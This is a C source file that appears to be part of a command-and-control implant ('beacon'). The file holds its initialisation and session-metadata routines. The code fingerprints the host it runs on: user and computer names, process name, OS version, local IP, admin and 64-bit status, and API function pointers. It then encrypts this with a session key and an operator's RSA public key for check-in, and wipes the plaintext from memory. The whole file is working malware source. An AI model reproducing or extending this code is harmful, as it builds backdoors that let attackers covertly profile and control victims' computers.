#include "channel.h"
#include "commands.h"
#include "security.h"
#include "beacon.h"
#include "link.h"
#include "build.h"
#include "parse.h"

/* id for our beacon */
unsigned int agentid;

/* base64 encoded session metadata info */
sessdata bigsession;

/* major OS version */
DWORD majorVersion;

/* determine if we're a VISTA or later system */
BOOL is_vista_or_later() {
	return majorVersion >= 6;
}

/* prototype of func that will generate our agentid */
unsigned int genagentid();

/* populate our session metadata please */
void populate_metadata(builder * b, int agentid) {
	datap         * blob      = data_alloc(sizeof(OSVERSIONINFO) + 256 + 256 + 256 + 256);
	OSVERSIONINFO * osvi      = (OSVERSIONINFO *)data_ptr(blob, sizeof(OSVERSIONINFO));
	char          * buffer    = data_ptr(blob, 256);
	char          * computer  = data_ptr(blob, 256);
	char          * user      = data_ptr(blob, 256);
	char          * temp      = data_ptr(blob, 256);
	char          * procname  = NULL;
	u_long          localhost;
	int             len       = 256;
	int             rlen      = 0;

	/* determine the current username */
	len = 256;
	GetUserNameA(user, (LPDWORD) & len);

	/* determine the computer name too */
	len = 256;
	GetComputerNameA(computer, (LPDWORD)&len);

	/* get our localhost */
	localhost = channel_localip();

	/* get our process name */
	/* get our process name and shorten it down to the filename only */
	if (GetModuleFileName(NULL, temp, 256) != 0) {
		procname = strrchr(temp, '\\');
		if (procname != NULL)
			procname++;
	}

	if (procname == NULL)
		procname = "";

	/* query the OS version */
    osvi->dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionExA(osvi);

	/* store the major version for use later */
	majorVersion = osvi->dwMajorVersion;

	/* push our version info */
	build_add_byte(b,  (BYTE)osvi->dwMajorVersion);
	build_add_byte(b,  (BYTE)osvi->dwMinorVersion);
	build_add_short(b, (SHORT)osvi->dwBuildNumber);

	/* copy our function pointers for GetProcAddress and GetModuleHandleA */
#if defined _M_X64
	build_add_int(b, (DWORD)(((__int64)GetProcAddress >> 32) & 0xFFFFFFFF));
#else
	build_add_int(b, (DWORD)0);
#endif
	build_add_int(b, (DWORD)GetModuleHandleA);
	build_add_int(b, (DWORD)GetProcAddress);

	/* add our localhost IP address */
	build_add_int(b, (DWORD)localhost);

	/* session identifier [magic number:4, tab delimited data] */
	_snprintf(buffer, 256, "%s\t%s\t%s", computer, user, procname);
	rlen = strlen(buffer);
	
	/* truncate the above to 89 bytes. This is a HARD sanity check and we should not hit this limit.
       Our max space is 128 bytes. Here's the break down:

	    16 bytes = session key
		2  bytes = platform encoding id (ANSI)
	    2  bytes = platform encoding id (OEM)
		4  bytes = agent ID
		4  bytes = process ID
		2  bytes = port value (SSH sessions)
		1  byte  = flags
		------------------------------------------------------ (78b)
		1  byte  = major version
		1  byte  = minor version
		2  byte  = build number
		4  bytes = GetProcAddress/GetModuleHandle pointer (HIGH)
		4  bytes = GetModuleHandleA pointer (LOW)
		4  bytes = GetProcAddress   pointer (LOW)
		4  bytes = local host IP address (IPv4)
		58 bytes = metadata
		------------------------------------------------------ (19b)
		8 bytes = encryption overhead
		11 bytes = RSA padding (mandatory minimum)
	*/
	if (rlen > 58)
		rlen = 58;

	/* add our (truncated?) metadata string to our metadata package */
	build_add_data(b, buffer, rlen);

	/* clear&free the memory we allocated here */
	data_free(blob);
}

#define METADATA_FLAG_NOTHING    1
#define METADATA_FLAG_AGENT_X64  2
#define METADATA_FLAG_TARGET_X64 4
#define METADATA_FLAG_ADMIN      8

void agent_init(char * buffer, DWORD max) {
	builder b;
	char    sessionkey[16];
	WORD    encoding_ansi = (WORD)GetACP();
	WORD    encoding_oem = (WORD)GetOEMCP();
	DWORD   len;
	BYTE    flagme = 0;

	/* create a [random] AES session key */
	rng_get_bytes((unsigned char *)sessionkey, KEY_SIZE, NULL);

	/* init our crypto */
	security_init(sessionkey);

	/* determine agent id */
	srand(GetTickCount() ^ GetCurrentProcessId());
	agentid = genagentid();
	bigsession.myid = agentid;

	/* handle some flags */
	if (is_x64())
		flagme |= METADATA_FLAG_AGENT_X64;

	if (is_x64() || is_wow64(GetCurrentProcess()))
		flagme |= METADATA_FLAG_TARGET_X64;

	if (is_admin())
		flagme |= METADATA_FLAG_ADMIN;

	/* format our buffer with our data, suitable for decrypt */
	build_init(&b, buffer, max);
	build_add_data(&b, sessionkey, 16);
	build_add_data(&b, (char *)&encoding_ansi, 2);
	build_add_data(&b, (char *)&encoding_oem, 2);
	build_add_int(&b, agentid);
	build_add_int(&b, GetCurrentProcessId());
	build_add_short(&b, 0);     // port value--used by SSH sessions
	build_add_byte(&b, flagme);
	populate_metadata(&b, agentid);	/* populate our metadata via this builder */

	len = build_length_rsa(&b);

	/* store our encrypted data into bigsession, so we can use/reuse it later */
	memset(bigsession.data, 0, 1024);
	bigsession.length = 128;
	memcpy(bigsession.data, buffer, len);

	/* RSA encrypt our Beacon metadata y0 */
	rsa_encrypt_once(setting_ptr(SETTING_PUBKEY), buffer, len, bigsession.data, &bigsession.length);

	/* we don't need our metadata in memory... nope... nerpz... not at... all */
	memset(buffer, 0, len);
}